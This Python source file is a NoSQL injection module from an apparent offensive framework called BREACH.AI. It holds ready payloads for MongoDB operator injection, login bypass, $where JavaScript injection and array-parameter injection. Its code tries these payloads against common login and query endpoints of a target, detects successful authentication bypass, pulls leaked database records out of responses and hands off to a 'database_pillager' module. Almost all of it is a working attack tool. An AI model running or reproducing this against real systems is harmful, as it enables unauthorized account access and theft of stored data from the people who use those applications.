"""
BREACH.AI v2 - NoSQL Injection Attacker

Exploits NoSQL injection vulnerabilities in MongoDB, CouchDB, and other NoSQL databases.
Bypasses authentication and extracts data through operator injection.
"""

import asyncio
import json
import re
from typing import Optional
from urllib.parse import urljoin, urlencode

from breach.modules.base import (
    InitialAccessModule,
    ModuleConfig,
    ModuleInfo,
    register_module,
)
from breach.core.killchain import (
    BreachPhase,
    ModuleResult,
    EvidenceType,
    AccessLevel,
    Severity,
)


# MongoDB operator injection payloads
NOSQL_PAYLOADS = {
    "operator_injection": [
        # Basic operator injection
        {"$gt": ""},
        {"$ne": ""},
        {"$ne": None},
        {"$regex": ".*"},
        {"$exists": True},
        {"$gt": "", "$ne": ""},
    ],
    "auth_bypass_json": [
        # JSON body auth bypass
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": "admin", "password": {"$ne": ""}},
        {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}},
    ],
    "array_injection": [
        # URL parameter array injection
        "[$ne]=",
        "[$gt]=",
        "[$regex]=.*",
        "[$exists]=true",
        "[$in][]=admin",
    ],
    "where_injection": [
        # JavaScript $where injection
        {"$where": "1==1"},
        {"$where": "this.password.match(/.*/)"},
        {"$where": "function(){return true}"},
        {"$where": "this.username == 'admin'"},
    ],
}

# Error patterns indicating NoSQL database
NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoDB",
    r"mongo",
    r"BSON",
    r"ObjectId",
    r"CouchDB",
    r"DocumentDB",
    r"CosmosDB",
    r"Cannot convert.*to ObjectId",
    r"Cast to ObjectId failed",
    r"SyntaxError.*JSON",
    r"\$where.*not allowed",
    r"operator.*not allowed",
]

# Common auth endpoints to test
AUTH_ENDPOINTS = [
    "/api/login",
    "/api/auth/login",
    "/api/v1/login",
    "/api/v1/auth/login",
    "/api/users/login",
    "/login",
    "/auth/login",
    "/api/signin",
    "/api/auth/signin",
    "/api/authenticate",
    "/graphql",  # GraphQL endpoints
]

# Common query endpoints to test
QUERY_ENDPOINTS = [
    "/api/users",
    "/api/products",
    "/api/items",
    "/api/search",
    "/api/v1/users",
    "/api/v1/products",
    "/api/data",
]


@register_module
class NoSQLiAttacker(InitialAccessModule):
    """
    NoSQL Injection Attacker - Exploits NoSQL databases.

    Techniques:
    - MongoDB operator injection ($gt, $ne, $regex, etc.)
    - Authentication bypass via JSON manipulation
    - Array parameter injection
    - JavaScript $where injection
    - Data extraction through query manipulation
    """

    info = ModuleInfo(
        name="nosqli_attacker",
        phase=BreachPhase.INITIAL_ACCESS,
        description="NoSQL injection for auth bypass and data extraction",
        author="BREACH.AI",
        techniques=["T1190", "T1110"],  # Exploit Public-Facing App, Brute Force
        platforms=["web", "api"],
        requires_access=False,
        provides_access=True,
        max_access_level=AccessLevel.DATABASE,
    )

    async def check(self, config: ModuleConfig) -> bool:
        """Check if target might use NoSQL database."""
        # Check chain data for NoSQL indicators
        technologies = config.chain_data.get("technologies", [])
        nosql_indicators = ["mongodb", "mongoose", "couchdb", "dynamodb", "cosmos", "firebase"]

        for tech in technologies:
            if any(ind in tech.lower() for ind in nosql_indicators):
                return True

        # Always try if we have a target
        return bool(config.target)

    async def run(self, config: ModuleConfig) -> ModuleResult:
        """Execute NoSQL injection attacks."""
        self._start_execution()

        vulns = []
        target = config.target.rstrip("/")

        # Test authentication bypass
        auth_vulns = await self._test_auth_bypass(target, config)
        vulns.extend(auth_vulns)

        # Test query injection
        query_vulns = await self._test_query_injection(target, config)
        vulns.extend(query_vulns)

        # Test array injection on discovered endpoints
        array_vulns = await self._test_array_injection(target, config)
        vulns.extend(array_vulns)

        # Collect evidence
        for vuln in vulns:
            severity = Severity.CRITICAL if vuln.get("auth_bypass") else Severity.HIGH

            self._add_evidence(
                evidence_type=EvidenceType.API_RESPONSE,
                description=f"NoSQL Injection: {vuln['type']} at {vuln['endpoint']}",
                content={
                    "endpoint": vuln["endpoint"],
                    "injection_type": vuln["type"],
                    "payload": str(vuln["payload"]),
                    "response_snippet": vuln.get("response", "")[:500],
                    "auth_bypass": vuln.get("auth_bypass", False),
                },
                proves=f"NoSQL injection allows {vuln['impact']}",
                severity=severity,
            )

            # If we extracted data, add sample
            if vuln.get("data_extracted"):
                self._add_evidence(
                    evidence_type=EvidenceType.DATA_SAMPLE,
                    description="Data extracted via NoSQL injection",
                    content=vuln["data_extracted"][:5],  # Limit to 5 records
                    proves="Database data accessible through injection",
                    severity=Severity.CRITICAL,
                )

        # Determine access level
        access_gained = None
        if any(v.get("auth_bypass") for v in vulns):
            access_gained = AccessLevel.USER
        if any(v.get("data_extracted") for v in vulns):
            access_gained = AccessLevel.DATABASE

        return self._create_result(
            success=len(vulns) > 0,
            action="nosql_injection",
            details=f"Found {len(vulns)} NoSQL injection vulnerabilities",
            access_gained=access_gained,
            data_extracted={"nosql_vulns": vulns} if vulns else None,
            enables_modules=["database_pillager"] if access_gained else [],
        )

    async def _test_auth_bypass(self, target: str, config: ModuleConfig) -> list:
        """Test for authentication bypass via NoSQL injection."""
        vulns = []

        for endpoint in AUTH_ENDPOINTS:
            url = urljoin(target, endpoint)

            # Test JSON body injection
            for payload in NOSQL_PAYLOADS["auth_bypass_json"][:5]:
                response = await self._safe_request(
                    "POST",
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )

                if response and self._is_auth_bypass(response):
                    vulns.append({
                        "endpoint": endpoint,
                        "type": "auth_bypass_json",
                        "payload": payload,
                        "response": response.get("text", "")[:500],
                        "auth_bypass": True,
                        "impact": "authentication bypass - unauthorized access",
                    })
                    break  # Found vuln, move to next endpoint

                # Check for NoSQL errors (info disclosure)
                if response and self._has_nosql_error(response.get("text", "")):
                    vulns.append({
                        "endpoint": endpoint,
                        "type": "nosql_error_disclosure",
                        "payload": payload,
                        "response": response.get("text", "")[:500],
                        "impact": "NoSQL database error disclosure",
                    })
                    break

            # Test $where injection
            for payload in NOSQL_PAYLOADS["where_injection"][:3]:
                response = await self._safe_request(
                    "POST",
                    url,
                    json={"username": "admin", **payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )

                if response and self._is_auth_bypass(response):
                    vulns.append({
                        "endpoint": endpoint,
                        "type": "where_injection",
                        "payload": payload,
                        "auth_bypass": True,
                        "impact": "JavaScript injection in $where clause",
                    })
                    break

        return vulns

    async def _test_query_injection(self, target: str, config: ModuleConfig) -> list:
        """Test for data extraction via query injection."""
        vulns = []

        for endpoint in QUERY_ENDPOINTS:
            url = urljoin(target, endpoint)

            # Test operator injection in query params
            for payload in NOSQL_PAYLOADS["operator_injection"][:4]:
                # Try as JSON body
                response = await self._safe_request(
                    "GET",
                    url,
                    params={"filter": json.dumps(payload)},
                    timeout=10,
                )

                if response and self._has_data_leak(response):
                    data = self._extract_data(response)
                    vulns.append({
                        "endpoint": endpoint,
                        "type": "query_operator_injection",
                        "payload": payload,
                        "data_extracted": data,
                        "impact": "data extraction via operator injection",
                    })
                    break

                # Try POST with JSON
                response = await self._safe_request(
                    "POST",
                    url,
                    json={"query": payload},
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                )

                if response and self._has_data_leak(response):
                    data = self._extract_data(response)
                    vulns.append({
                        "endpoint": endpoint,
                        "type": "query_operator_injection_post",
                        "payload": payload,
                        "data_extracted": data,
                        "impact": "data extraction via POST query injection",
                    })
                    break

        return vulns

    async def _test_array_injection(self, target: str, config: ModuleConfig) -> list:
        """Test for array parameter injection."""
        vulns = []

        # Get endpoints from recon or use defaults
        endpoints = config.chain_data.get("endpoints", AUTH_ENDPOINTS + QUERY_ENDPOINTS)

        for endpoint in endpoints[:10]:
            url = urljoin(target, endpoint)

            for injection in NOSQL_PAYLOADS["array_injection"][:3]:
                # Inject into common parameters
                for param in ["id", "username", "user", "email", "filter"]:
                    test_url = f"{url}?{param}{injection}"

                    response = await self._safe_request("GET", test_url, timeout=10)

                    if response:
                        if self._has_data_leak(response):
                            vulns.append({
                                "endpoint": endpoint,
                                "type": "array_injection",
                                "payload": f"{param}{injection}",
                                "data_extracted": self._extract_data(response),
                                "impact": "data extraction via array injection",
                            })
                            break

                        if self._has_nosql_error(response.get("text", "")):
                            vulns.append({
                                "endpoint": endpoint,
                                "type": "array_injection_error",
                                "payload": f"{param}{injection}",
                                "impact": "NoSQL error disclosure via array injection",
                            })
                            break

        return vulns

    def _is_auth_bypass(self, response: dict) -> bool:
        """Check if response indicates successful authentication bypass."""
        if not response:
            return False

        status = response.get("status_code", 0)
        text = response.get("text", "").lower()
        headers = response.get("headers", {})

        # Check for success status with auth indicators
        if status == 200:
            # Check for tokens/sessions
            auth_indicators = ["token", "jwt", "session", "bearer", "access_token", "auth"]
            if any(ind in text for ind in auth_indicators):
                return True

            # Check for Set-Cookie
            if "set-cookie" in str(headers).lower():
                return True

            # Check for user data in response
            if any(ind in text for ind in ["user", "profile", "email", "name", "admin"]):
                # Avoid false positives from error messages
                if "error" not in text and "invalid" not in text:
                    return True

        return False

    def _has_nosql_error(self, text: str) -> bool:
        """Check for NoSQL database error messages."""
        for pattern in NOSQL_ERROR_PATTERNS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _has_data_leak(self, response: dict) -> bool:
        """Check if response contains leaked data."""
        if not response:
            return False

        status = response.get("status_code", 0)
        text = response.get("text", "")

        if status != 200:
            return False

        try:
            data = json.loads(text)
            # Check if we got an array or object with data
            if isinstance(data, list) and len(data) > 0:
                return True
            if isinstance(data, dict):
                if "data" in data and data["data"]:
                    return True
                if "results" in data and data["results"]:
                    return True
                if "users" in data or "items" in data:
                    return True
        except json.JSONDecodeError:
            pass

        return False

    def _extract_data(self, response: dict) -> list:
        """Extract data from response."""
        text = response.get("text", "")

        try:
            data = json.loads(text)
            if isinstance(data, list):
                return data[:10]  # Limit to 10 records
            if isinstance(data, dict):
                if "data" in data:
                    return data["data"][:10] if isinstance(data["data"], list) else [data["data"]]
                if "results" in data:
                    return data["results"][:10] if isinstance(data["results"], list) else [data["results"]]
                return [data]
        except json.JSONDecodeError:
            pass

        return []
